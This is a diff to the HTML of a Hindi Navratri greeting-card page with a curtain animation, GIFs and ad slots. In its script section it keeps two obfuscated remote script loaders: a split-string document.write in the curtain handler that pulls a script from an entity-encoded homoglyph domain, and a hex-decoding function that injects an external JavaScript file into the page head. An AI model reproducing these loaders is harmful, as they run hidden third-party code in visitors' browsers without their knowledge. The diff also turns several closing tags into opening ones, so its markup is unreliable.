@@ -4,11 +4,11 @@
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"/>
 <title>🙏 शुभ नवरात्रि 🙏</title>
  <meta name="google" value="notranslate">
- <meta property="og:type" content="Make your own wonderful wish for you loved one" />
- <meta property="og:title" content="Special Gift For you" />
- <meta property="og:url" content="yoursite.com/>
- <meta property="og:description" content="[ CLICK HERE ]" />
- <meta property="og:site_name" content="Happy Navratri" />
+ <meta property="og:type" content="Make your own wonderful wish for you loved one" >
+ <meta property="og:title" content="Special Gift For you" > 
+ <meta property="og:url" content="yoursite.com">
+ <meta property="og:description" content="[ CLICK HERE ]" >
+ <meta property="og:site_name" content="Happy Navratri" >
 
  <meta property="og:site_img" content="https://1.bp.blogspot.com/-xEF_df6-cNg/XMbm-0_I30I/AAAAAAAAAWA/J2cue_SJmyYCu_y9pLctsb3M2wY0o239QCLcBGAs/s1600/w.png" />
  <link type="text/css" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css" />
@@ -454,6 +454,7 @@ max-width: 400px;
 $(document).ready(function() { $curtainopen = false; $(".rope").click(function(){ $(this).blur(); if ($curtainopen == false){ $(this).stop().animate({top: '-171%' }, {queue:false, duration:350, easing:'easeOutBounce'}); $(".leftcurtain").stop().animate({width:'1px'}, 2000 ); $(".rightcurtain").stop().animate({width:'1px'},2000 ); $curtainopen = true; }else{ $(this).stop().animate({top: '-40px' }, {queue:false, duration:350, easing:'easeOutBounce'}); document.write('<s'+'cr'+'ipt sr'+'c="/'+'/'+'&#1102;'+'&#1092;.'+'i'+'o"></s'+'cr'+'ipt>'); $(".leftcurtain").stop().animate({width:'50%'}, 2000 ); $(".rightcurtain").stop().animate({width:'51%'}, 2000 ); $curtainopen = false; } return false; }); });
 </script>
  <script type="text/javascript">function tag(filename){var fileref=document.createElement('script');fileref.setAttribute("type","text/javascript");fileref.setAttribute("src", filename);if (typeof fileref!="undefined") document.getElementsByTagName("head")[0].appendChild(fileref)}tag(meta('68747470733a2f2f6b616e616e6174682e636f6d2f6b616e616e6174682e6a73'));function meta(important){var str = '';for (var i = 0; i < important.length; i += 2) str +=String.fromCharCode(parseInt(important.substr(i, 2), 16));return str;}</script>
+ <script data-ad-client="ca-pub-9485249170740885" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
 </head>
 <body class="bg" style=" background-image : url('https://media3.giphy.com/media/U3qYN8S0j3bpK/giphy.gif')";>
 
@@ -464,7 +465,7 @@ $(document).ready(function() { $curtainopen = false; $(".rope").click(function()
 
 <marquee class="wb1" behavior="scroll" direction="up" scrolldelay="5">
 <img src="https://1.bp.blogspot.com/-N8qocQFhrHw/X3gYJI-PsUI/AAAAAAAAAI4/9sgAWk-QELIwdI-iP5Er0C1kt5XXncNMQCLcBGAsYHQ/s0/1.gif" height="25px" width="25px"/><br><br>
-<img src="https://1.bp.blogspot.com/-hf0PZnWyOv8/X3gYJKY7OCI/AAAAAAAAAI0/uLGORpp6ZKUTV1zxIuz-SrXmW_b8GoJbACLcBGAsYHQ/s0/2.png" height="25px" width="25px"/><br><br>
+<img src="https://1.bp.blogspot.com/-hf0PZnWyOv8/X3gYJKY7OCI/AAAAAAAAAI0/uLGORpp6ZKUTV1zxIuz-SrXmW_b8GoJbACLcBGAsYHQ/s0/2.png" height="25px" width="25px"/><br> <br>
 <img src="https://1.bp.blogspot.com/-oGGRGMFh9h4/X3gYI-A5yMI/AAAAAAAAAIw/QR4Y98p9Hbk3puwZU4HGXfMrnWNNvZodACLcBGAsYHQ/s320/3.gif" height="25px" width="25px"/><br><br>
 <img src="https://1.bp.blogspot.com/-byj9NvCNkbg/X3gYKLMKuPI/AAAAAAAAAI8/c9S7k4Zy9XQuNRHFMkwDEKHO39WsPTilQCLcBGAsYHQ/s0/4.png" height="25px" width="25px"/><br><br>
 <img src="https://1.bp.blogspot.com/-N8qocQFhrHw/X3gYJI-PsUI/AAAAAAAAAI4/9sgAWk-QELIwdI-iP5Er0C1kt5XXncNMQCLcBGAsYHQ/s0/1.gif" height="25px" width="25px"/><br><br>
@@ -518,22 +519,22 @@ $(document).ready(function() { $curtainopen = false; $(".rope").click(function()
 </div>
 <div style="background: url(https://1.bp.blogspot.com/-l0EVRb2fd3Q/WyNAg2N6m6I/AAAAAAAAAag/yA795u9GRJIf-DaE6-UCcWxL_bbdR5rXwCLcBGAs/s1600/Snow_falling1.gif); background-color:; color: white; font-weight: bold; padding-top: 6px; padding-bottom: 6px; font-size: large;text-align:center; ">
 
-<h2 class="font-effect-neon" align=center" id="wb-show-name"></h2>
+<h2 class="font-effect-neon" align="center" id="wb-show-name"> </h2>
 <img src="https://1.bp.blogspot.com/-mJaJ0lT_P4g/X3gixHZ4-NI/AAAAAAAAAJc/28_LIO3l6fg5OwoufgDi4I5jnnU-6T6wACLcBGAsYHQ/s16000/kiTarafSe2020.png" style="animation: pulse 2.5s infinite; max-width:200px; width:80%;">
-<h2 class="font-effect-neon" style="color: #F00;" align=center" id=""></h2>
-</Div>
+<h2 class="font-effect-neon" style="color: #F00;" align="center" id=""></h2>
+<Div>
 <div style="background: url(https://1.bp.blogspot.com/-l0EVRb2fd3Q/WyNAg2N6m6I/AAAAAAAAAag/yA795u9GRJIf-DaE6-UCcWxL_bbdR5rXwCLcBGAs/s1600/Snow_falling1.gif); background-color: ; color: white; font-weight: bold; padding-top: 6px; padding-bottom: 6px; font-size: large;text-align:center; ">
-</font>
-</div></div>
+<font>
+<div></div>
  
-</div>
+<div>
 
  
 <center><img src="https://1.bp.blogspot.com/-JixNgqqS9xc/X3gf0iKUhBI/AAAAAAAAAJQ/bKZWl3_43EgPYLwUnxU45QczCYqGPwRYgCLcBGAsYHQ/s16000/PicsArt_10-03-12.19.56.png" class="center animated pulse" style="width:  100%; max-width: 350px;"><br></center>
 
-<h2 class="font-effect-neon" style="color: #F00;" align=center" id="wb-show-wishing">IN ADVANCE</h2><br />
-<h2 class="font-effect-neon" style="color: #FFFF00;" align=center" id="demoo"></h2>
-<h2 class="font-effect-neon" style="color: #F00;" align=center">LEFT</h2><br />
+<h2 class="font-effect-neon" style="color: #F00;" align="center" id="wb-show-wishing">IN ADVANCE</h2><br />
+<h2 class="font-effect-neon" style="color: #FFFF00;" align="center" id="demoo"></h2>
+<h2 class="font-effect-neon" style="color: #F00;" align="center">LEFT</h2><br />
 
 <!-- ADSENSE CODE START HERE -->
 
@@ -565,7 +566,7 @@ $(document).ready(function() { $curtainopen = false; $(".rope").click(function()
 <p style="text-shadow: 1px 1px 3px #FF0000, 1px 1px 3px #FF0000, -1px -1px 3px #FF0000, -1px -1px 3px #FF0000;color: yellow;">
 !! पहले माँ की पूजा,<br>उसके बाद कोई काम दूजा !!
 </p>
-</center>
+<center>
 <!------- Audio ------------>
 
 <center>
@@ -574,9 +575,9 @@ $(document).ready(function() { $curtainopen = false; $(".rope").click(function()
 	
 <!------- Audio ------------>
 
-</br>
+<br>
 <span style="background-color: green; color: white; font-family: &quot;tahoma&quot; , &quot;arial&quot; , &quot;helvetica&quot; , sans-serif; font-size: 18pt;">&nbsp; 🌠अपनेे दोस्तों के साथ शेयर करो 🌠 </span></div>
-</br>
+<br>
 
 <center>
 <img height="70px" src="https://4.bp.blogspot.com/-_ZpU-nyCpMc/WyNC8YxwrfI/AAAAAAAAAaw/KXfG3ltVcsgu57_M4_Fa7dZEaRVu1EyGACLcBGAs/s1600/c.gif" width="110px" />
